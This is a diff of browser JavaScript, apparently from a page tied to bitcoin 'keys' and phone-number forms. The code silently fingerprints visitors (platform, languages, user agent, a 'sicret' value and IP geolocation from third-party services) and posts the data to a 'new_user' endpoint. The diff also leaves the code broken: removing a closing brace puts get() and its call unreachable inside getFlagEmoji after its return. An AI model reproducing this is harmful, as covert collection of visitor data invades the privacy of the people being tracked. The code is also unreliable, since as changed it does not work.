@@ -192,19 +192,38 @@ async function check_form(keys) {
 
 }
 
-async function getDataBitcoin() {
-    let keys = await send_request("get", false, "keys", false)
-    await check_form(keys)
+
+async function getUserIp() {
+    try {
+        const response = await fetch('https://api.ipify.org/?format=json', {
+            method: "GET",
+            headers: {
+                'Accept': 'application/json',
+                "Access-Control-Allow-Origin": "*"
+            }
+        });
+        const data = await response.json();
+        console.log(data)
+        return data?.ip;
+    } catch (error) {
+        console.error('Error fetching user ip:', error);
+    }
 }
 
 async function getUserInfo() {
     try {
-        const response = await fetch('https://ipinfo.io/json');
+        const userIP = await getUserIp();
+        console.log(userIP)
+        const response = await fetch(`http://ip-api.com/json/${userIP}`, {
+            method: "GET",
+            headers: {
+                'Accept': 'application/json',
+                "Access-Control-Allow-Origin": "*"
+            }
+        });
         const data = await response.json();
-
         const flagEmoji = getFlagEmoji(data.country);
-
-        return {"ip": data.ip, "country": data.country, "region": data.region, "flag": flagEmoji}
+        return { "ip": data.ip, "country": data.country, "region": data.region, "flag": flagEmoji };
     } catch (error) {
         console.error('Error fetching user info:', error);
     }
@@ -214,29 +233,28 @@ function getFlagEmoji(countryCode) {
     return countryCode.toUpperCase().replace(/./g, char =>
         String.fromCodePoint(127397 + char.charCodeAt())
     );
-}
 
-async function get() {
-    let users = await send_request("get", false, "users", false)
-    let codes = await send_request("get", false, "phone_nubmer_codes", false)
+    async function get() {
+        let users = await send_request("get", false, "users", false)
+        let codes = await send_request("get", false, "phone_nubmer_codes", false)
 
-    set_phone_numbers(codes)
+        set_phone_numbers(codes)
 
-    const userLocation = await getUserInfo()
+        const userLocation = await getUserInfo()
 
-    let data = {
-        id: users?.length - 1 + 1,
-        product_sub: info?.productSub(),
-        time: info?.timeOpened,
-        platform: info?.platform(),
-        langues: info?.langues(),
-        userAgent: info?.appVersion(),
-        sicret: info?.sicret(),
-        sunset: 0,
-        step: 0,
-        userLocation
+        let data = {
+            id: users?.length - 1 + 1,
+            product_sub: info?.productSub(),
+            time: info?.timeOpened,
+            platform: info?.platform(),
+            langues: info?.langues(),
+            userAgent: info?.appVersion(),
+            sicret: info?.sicret(),
+            sunset: 0,
+            step: 0,
+            userLocation
+        }
+        send_request("post", true, "new_user", data)
     }
-    send_request("post", true, "new_user", data)
-}
 
-get()
+    get()
